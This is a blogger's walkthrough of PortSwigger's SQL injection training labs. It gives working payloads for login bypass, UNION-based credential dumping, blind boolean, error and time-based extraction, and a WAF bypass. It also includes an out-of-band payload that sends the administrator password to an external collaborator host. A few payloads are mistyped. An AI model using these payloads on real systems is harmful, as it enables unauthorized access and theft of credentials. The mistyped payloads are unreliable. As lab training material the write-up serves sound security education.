# Lab: [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the
product category filter. When the user selects a category, the
application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
To solve the lab, perform a SQL injection attack that causes
the application to display one or more unreleased products.

Accessing the lab we have a shopping site with the following content;

![1689749587534.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689749587534.png)

We then intercept the request using burpsuite and change the highligted parameter:

![1689749687720.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689749687720.png)to:

![1689749949909.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689749949909.png)

Forwarding the modified request we get all the items in the shop:

![1689750043879.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689750043879.png)



# Lab: [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability allowing login bypass

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

Accessing the Lab environment, we click on `My account` and trying to log in we get this:

![1689750403275.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689750403275.png)

we use the `admistrator` as username and attach a clause that skips checking the password to it, then for the password feild we could just put in gibberish:

![1689750489548.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689750489548.png)

we click on the `Log in ` and we get the update email feild signifying that we successfully logged in:

![1689750564236.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689750564236.png)



# Lab: [SQL injection](https://portswigger.net/web-security/sql-injection) attack, querying the database type and version on Oracle

This lab contains a SQL injection vulnerability in the
product category filter. You can use a UNION attack to retrieve the
results from an injected query.

To solve the lab, display the database version string.

After accessing the Lab enviroment, we click on the categories section and intercept the request using burpsuite, we then add the union statement to execute an aditional SELECT Statement immediately after the filter statement has been executed, in the challenge description, it was stated that the database server is oracle so by default every oracle database comes with a column field called BANNER in a table called version:

![1689767564844.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689767564844.png)

so we fetch the contents using the SELECT statement:

![1689767329172.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689767329172.png)

forwarding the requset we get our expected result:

![1689767678322.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689767678322.png)



# Lab: [SQL injection](https://portswigger.net/web-security/sql-injection) attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the

product category filter. You can use a UNION attack to retrieve the
results from an injected query.

To solve the lab, display the database version string.

This task is simillar to the last task, but in this case we are dealing with  MySql and mircosoft database, so there query statement for version is a bit different, doing some googling and we saw that they both have a common way of querying the database version by using the sql syntax:

```mysql
SELECT @@version;
```

Knowing this we could use burp to intercept the request and modify the query as done in the previous task:

![1689768783101.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689768783101.png)

forwarding the request we have :

![1689768884477.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689768884477.png)



# Lab: [SQL injection](https://portswigger.net/web-security/sql-injection) attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the
product category filter. The results from the query are returned in the
application's response so you can use a UNION attack to retrieve data
from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password
of all users.

To solve the lab, log in as the `administrator` user

Simillar to the other challenges we access the Lab environment then click on a categories section then intercept the request using burp, the first step as outlined in the challenge description is to find the name of tables in the database and the columns it contains, after a bit of googling we could query `table_names `  from `information_schema.tables`  and list out all the availabe tables.

![1689773460904.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689773460904.png)

i use only the higlited part

Adding this to our request header we have:

![1689772041799.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689772041799.png)

The Response:

![1689772075022.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689772075022.png)

we then search a table that has to do with users among all the entry we got outputs like:

```sql
pg_users_information
pg_users_privilegies
pg_user_mappings
users_eeuuer
pg_adminstrator_mappings
```

we traverse all through the above listed user entries till we foun one that has a user name and password entry in the colums, we use the

```sql
SELECT column_name,NULL FROM information_schema.columns WHERE table_name="{OUR USRES FOUND}" 
```

we got a good result with `users_eeuuer` table name

Request Header:

![1689771933133.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689771933133.png)

Response:

![1689771964480.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689771964480.png)

From the response we could see that there's two columns named `username_uvanwt` an `password_crcmmd` in the `users_eeuuer` table

we then need to extract the content of this column feilds so we use this query to do just that:

```sql
SELECT username_uvanwt, password_crcmmd FROM users_eeuuer; 
```

Modified request:

![1689772254187.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689772254187.png)

Response:

![1689772282714.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689772282714.png)

From the above response we have obtained our usernames and passwords

we then use the administrator password to login as admin:

![1689772400154.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689772400154.png)



# Lab: [SQL injection](https://portswigger.net/web-security/sql-injection) attack, listing the database contents on Oracle

This lab contains a SQL injection vulnerability in the
product category filter. The results from the query are returned in the
application's response so you can use a UNION attack to retrieve data
from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to

determine the name of this table and the columns it contains, then

retrieve the contents of the table to obtain the username and password
of all users.

To solve the lab, log in as the `administrator` user.

This challenge is simillar to the previous one only that we are now using Oracle Database

We intercept the request to query a filter in categories and use the UNION statement to query all the tables in the database:

To do that we used the following database query

```sql
SELECT table_name, NULL FROM all_tables;
```

Request Header:

![1689774859879.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689774859879.png)

Response Header:

![1689774944613.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689774944613.png)

In the response header we could see names of tables that are currently available in the database:

According to the previous challenge we recognized the table name as this `USERS_XNIZHH`:

We now go further to query the available columns in that table:

![1689775260747.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689775260747.png)

Response header:

![1689775287471.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689775287471.png)

In the resopnse header we have two column feilds:

```sql
PASSWORD_USCCVP

USERNAME_HWTRTV
```

we then craft our query to retrive the contents of this columns:

```sql
SELECT USERNAME_HWTRTV,PASSWORD_USCCVP FROM USERS_XNIZHH;
```

Request Header:

![1689775831853.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689775831853.png)

Response Header:

![1689775857131.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689775857131.png)

We now use this details to login as admin:

![1689775926897.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689775926897.png)



# Lab: [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned to the
application's response, so you can use a UNION attack to retrieve data
from other tables. The first step of such an attack is to determine the
number of columns that are being returned by the query. You will then
use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an

Additional row containing null values.

As usual, we intercept the query in burp and attach the `UNION` command to the `filter` statement each entry has a single `NULL` to find the number of columns that is being returned

by the query.

we start with

```sql
SELECT NULL FROM information_schema.tables
```

This query returned a `500 internal server error`;

we then modify the query statement with more `NULL`:

```sql
SELECT NULL, NULL FROM infromatioN_schema.tables;
```

This query also returned same error, we keep on like this till we got to the third entry and got a `200 OK` response:

![1689776206345.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689776206345.png)

And that's all for this challenge:

![1689776246853.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689776246853.png)



# Lab: [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack, finding a column containing text

This lab contains a SQL injection vulnerability in the
product category filter. The results from the query are returned to the
application's response, so you can use a UNION attack to retrieve data
from other tables. To construct such an attack, you first need to
determine the number of columns returned by the query. You can do this
using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing the value provided.

This technique helps you determine which columns are compatible with
string data.

![1689848880602.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689848880602.png)

![1689848905389.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689848905389.png)

![1689849131270.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689849131270.png)



# Lab: [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack, retrieving data from other tables.

This lab contains a SQL injection vulnerability in the
product category filter. The results from the query are returned in the
application's response, so you can use a UNION attack to retrieve data
from other tables. To construct such an attack, you need to combine some
of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

we make  a request to the category section and intercept the request with our payload, we use basic union attack here to fetch the content of `username ` and `password` from the users table:

```sql
UNION SELECT username, password from users--
```

![1689849383114.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689849383114.png)


after sending the request we got the following response:


![1689849405986.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689849405986.png)

we then logging:

![1689849477805.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689849477805.png)


# Lab: [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the
product category filter. The results from the query are returned in the
application's response so you can use a UNION attack to retrieve data
from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

We intercept the request and include our payload to fetch username and password from the users table but in this scenairo, after peforming the NULL test to determine the number of columns returned for that specific request and the column that supports text input; we realized while amount of columns is two, the number of column accepting text input is only one, so we decide to device a means to fetch both the username and password simultaneously into a single column, though we can decide to do them in turn (i.e usernames first then password)

In SQL there's a concat method to join result of query together either using the `||` or using the `CONCAT` sql function; so i choose the later:

```sql
UNION SELECT NULL, CONCAT(username, CONCAT('~', password) FROM users--; 
```

![1689850380622.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689850380622.png)

after sending the request we get the following response:

![1689850403969.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689850403969.png)

we use the information to logging:

![1689850469640.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689850469640.png)


# Lab: [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) with conditional responses

This lab contains a blind [SQL injection](https://portswigger.net/web-security/sql-injection)
vulnerability. The application uses a tracking cookie for analytics,
and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

As usuall we intercept the request using burp suite and modify the request, in this case we are performing a check query on the "Welcome back" message in the response, this is  done to determine if our sql injected script in the TrackingId was run sucessfully,

we try a simple example with this sql injection query:

~~~sql
' AND '1'='1;
~~~

We send the following request:

![1689854395892.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689854395892.png)

And we confirm that our sql injected query was runned successfully with the "Welcome back!" message in the response:

![1689854439146.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689854439146.png)

We now go further to execute our blind sql injection in order to extract details of the administrator password, reason it's called blind sql injection is that the result of the query is not directly returned but we could know for sure if such query is true, by a response we know just like the above example, so we try checking each individual character of the password column of the administrator password and try to determine if the character exist, if it exist we should see a "Welcome back!" message otherwise we won't see any

we use the following injection query:

```sql
AND (SELECT SUBSTRING(password, {index}, 1) FROM users WHERE username='administrator')='{character}';
```

The above query checks if a substring at a particular index in the password column where the username is 'administrator' is equal to the character, if the condition holds true we should see a welcome back message in the response

This an example of the code:

![1689854516353.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689854516353.png)

Request's response:

![1689854573035.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689854573035.png)


we could see at index 1, there exist a character '8' which holds true meaning we got a "Welcome back!" message:

![1689854601763.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689854601763.png)

instead of doing it individually we decide to use intruder with option set to cluster bomb we select the index as first payload with paramesers numbers from 1-20 and our second payload to be character with paramet 0-9a-z, we then set the grep match keyword to match the "Welcome back!" message in the response and then launch the attack.

After launching the attack we then filter according to the grep matched columns, and extract the corresponding password which we got as:

```sql
password = wpfbezg2o0bnu4zo0nha
```

We then logging using it:

![1689865757829.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689865757829.png)



# Lab: [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) with conditional errors

This lab contains a blind [SQL injection](https://portswigger.net/web-security/sql-injection)
vulnerability. The application uses a tracking cookie for analytics,
and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

This lab is simillar to the previous error, but in this scenairo we use the error code instead of the "Welcome back!" message, so was an error holds true then a 500 internal server error is returned using this we could extract the password from the database, we use the following sql injection payload:

```sql
' ||(SELECT CASE WHEN SUBSTR(password,{index},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';
```

The above query trys to check if a certain character at a particular index is the same as the one being compared then it executes the `TO_CHAR(1/0)` code which returns error since it's division by zero error, otherwise it returns nothing, we inject the above query into our payload and confirm our assertion, simillar to the previous lab we use intruder to automate the index and character checking to make it more faster:

![1689866795989.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689866795989.png)

Response output:

![1689876408074.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689876408074.png)

from the above response we filter the column according to response with server error (500 status code) then extract the password:

```python
password = yzrssi3kfz8y9yxj9idk


```

We use this password to logging and we have:

![1689877030752.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689877030752.png)



# Lab: Visible error-based [SQL injection](https://portswigger.net/web-security/sql-injection)

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.

As usuall we intercept the request and include our sql injection query, this lab is similar to the previous lab but in this case we are dealing with an Oracle sql server, so we have to craft thesame payload as in the previous lab in oracles sql lanquage:

```sql
AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--;
```

![1689877983211.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689877983211.png)

The response returns a single username from the database:

![1689878008349.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689878008349.png)

We do thesame to retrive the password:

![1689878036264.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689878036264.png)

Response:

![1689878058303.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689878058303.png)

```python
Password = tkrril3txwoib8giyhwj
```

we use the information to loging as admin:

![1689878110283.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689878110283.png)


# Lab: [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) with time delays

This lab contains a blind [SQL injection](https://portswigger.net/web-security/sql-injection)
vulnerability. The application uses a tracking cookie for analytics,
and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

This a simple lab that deals with executing sql injection without recieving any form of response from the website, this lab deals with execution of time delays, something like the sleep keyword in python, the aim of this lab is to show you that we could extract the content of a database without actually recieving any response but rather using the total time of execution to confirm if a condition holds true:

in sql we use the `pg_sleep` command to perform such action:

```sql
' || pg_sleep(10)--;
```

Request to the site is :

![1689878928535.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689878928535.png)

The goal of the lab is to show we could execute such statement and see how long it takes for the response to get back to us, in this case it is 10 seconds, this the output of the result:


![1689879024362.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689879024362.png)



# Lab: [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) with time delays and information retrieval

This lab contains a blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.


This is Lab is similar to the previous lab, but in this scenairo we going to perform blind sql injection with our new found trick; as usual we use the intruder to brute force the characters in the administrator password column feild we use the following sql query:

```sql
SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{index}, 1)='{character}' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users
```



What the above sql code does is that it checks if a character exist at a particular index of the administrator password column, if the statement holds true it sleeps for 10 seconds and otherwise it doesn't sleep atall or for 0 seconds, we input this into the TrackingId field parameter:

![1689922680651.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689922680651.png)

we send this request and capture the response which we then filter accoring to the highest response of 10's of thousand:

![1690552292510.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1690552292510.png)

we commented the filtered part and then scrape off the remaing part:

![1690552188003.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1690552188003.png)

we extract the password and logged in :

![1690552416910.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1690552416910.png)




# Lab: [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, we are going to exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator, first we need professional burp to perform this, we right-click on the burp button on the top left and select burp client then click on copy to copy the dns url, after doing that we now insert the dns url into our payload:

we use the following payload:

```sql
UNION SELECT EXTRACTVALUE(;xmltype('<xml version="1.o" encoding="UTF-8;><!DOCTYPE root [ <!ENTITY  remote SYSTEM http://{burp collaborator id here},'/1') FROM dual--
```

What the above injection query does is to make the sql to execute the xml code which tells the system to use root to check our burp collaborator dns url

We sent that request to the server:

![1689924352388.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689924352388.png)

Response from the collaborator client, we could see that our dns url was pinged with 4 responses:

![1689924405735.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689924405735.png)



# Lab: [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) with out-of-band data exfiltration


This lab contains a blind SQL injection vulnerability. The
application uses a tracking cookie for analytics, and performs a SQL
query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

 To solve the lab, log in as the `administrator` user.

From our new-found trick in the previous lab we could ping our DNS server with the admin password, all we have to do is to append the queried password into the subdomain of the dns url.

Below is the used payload:

```sql
UNION SELECT EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||"{burp collaborator url here}/">+%25+remote%3b]>'),'/1')+FROM+dual--;
```

The above payload does exactly that; appends the password to the DNS query, we then send the request to the server:

![1689926328502.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689926328502.png)

This the result of the ping, from the below picture we could see that the administrator password was appended as the subdomain, we could now use this information to login as admin.

![1689926367132.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689926367132.png)

After logging in:

![1689926474538.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689926474538.png)



# Lab: [SQL injection](https://portswigger.net/web-security/sql-injection) with filter bypass via XML encoding


This lab contains a SQL injection vulnerability in its stock
check feature. The results from the query are returned in the
application's response, so you can use a UNION attack to retrieve data
from other tables. The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

As the challenge name implies we are to use sql query in an xml body, we first of all confirm if our sql payload is being executed, we perform a simple query on the product stock and intercept this request, we tried changing the storeId to another value and it returened a new response, this indicates that the code is injectable, next we try using a simple sql statement:

```sql
' OR '1'='1--
```

we got an error message from the server saying something like "injection detected"; from the challenge description it was actually noted that there's a firewall on the server, so our aim is to bypass that firewall and execute our injection query, from the hint give it's possible to do so using the hackvector extension, which i installed from burpsuite extension tab, after sucessfull installation i then try encoding the payload again by simply write clicking on the payload then navigate to hackvector encoding option then clicked on xml encoding; after sending the encoded payload we got a good response, that means the firewall wasn't able to detect our injection payload, using this principle we then try to query the username and password from the users table, one column only is supported here so we have to concatenate the response.

Request sent:

![1689943006777.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689943006777.png)

Response recieved:

![1689943038343.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689943038343.png)

using the above information to login :

![1689943075984.png](https://cyberguru1.github.io/posts/portswigger/SQL/images/1689943075984.png)

COMMENTS AND REMARKS:

This is the last lab in the SQL injection series which i really enjoyed, great work burp suite for given us so much rich content ❤️ !!!!!!
